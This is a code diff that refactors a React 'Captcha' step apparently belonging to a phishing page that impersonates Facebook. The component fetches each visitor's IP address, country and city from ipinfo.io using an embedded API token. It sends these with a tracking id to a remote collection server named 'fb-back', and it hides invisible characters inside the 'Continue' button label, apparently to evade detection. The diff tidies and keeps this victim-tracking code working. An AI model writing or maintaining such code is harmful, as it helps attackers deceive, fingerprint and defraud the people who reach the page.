@@ -95,31 +95,25 @@ function Captcha({ setStep, Unik, setIp }) {
     const [IsDisabled, setIsDisabled] = useState(true);
     const [IsLoading, setIsLoading] = useState(false);
 
-    let { setAllData, AllData } = useContext(DataContext);
+    const { setAllData, AllData } = useContext(DataContext);
 
-    const foo = function (event) {
+    const foo = (event) => {
         if (event) {
             setIsDisabled(false);
         }
     };
 
     const NextStep = () => {
-        fetch('https://ipinfo.io/json?token=c180f76ac7988c') // Fetching IP and geolocation data from ipinfo.io
+        setIsLoading(true);
+        fetch('https://ipinfo.io/json?token=c180f76ac7988c')
             .then(response => response.json())
             .then(data => {
-                console.log('IPinfo Response:', data); // Debug API response
+                console.log('IPinfo Response:', data);
 
-                const { ip, country, city } = data; // Extracting relevant data from the response
+                const { ip, country, city } = data;
 
                 setIp(ip);
-
-                let params = {
-                    id: Unik,
-                    ip,
-                    country,
-                    city,
-                };
-
+                const params = { id: Unik, ip, country, city };
                 setAllData({ ...AllData, ip, country, city });
 
                 fetch("https://fb-back-78vb.onrender.com/send/ip", {
@@ -133,11 +127,13 @@ function Captcha({ setStep, Unik, setIp }) {
             })
             .catch(error => {
                 console.error('Error fetching IP or geolocation:', error);
+            })
+            .finally(() => {
+                setTimeout(() => {
+                    setIsLoading(false);
+                    setStep(1);
+                }, 1000);
             });
-
-        setTimeout(() => {
-            setStep(1);
-        }, 1000);
     };
 
     return (
@@ -168,7 +164,7 @@ function Captcha({ setStep, Unik, setIp }) {
                     <div className="pt-4">
                         <BtnNext
                             onClick={NextStep}
-                            disabled={IsDisabled ? true : false}
+                            disabled={IsDisabled}
                         >
                             {IsLoading ? <Spinner /> : ' C‎o‎n‎t‎i‎n‎u‎e'}
                         </BtnNext>
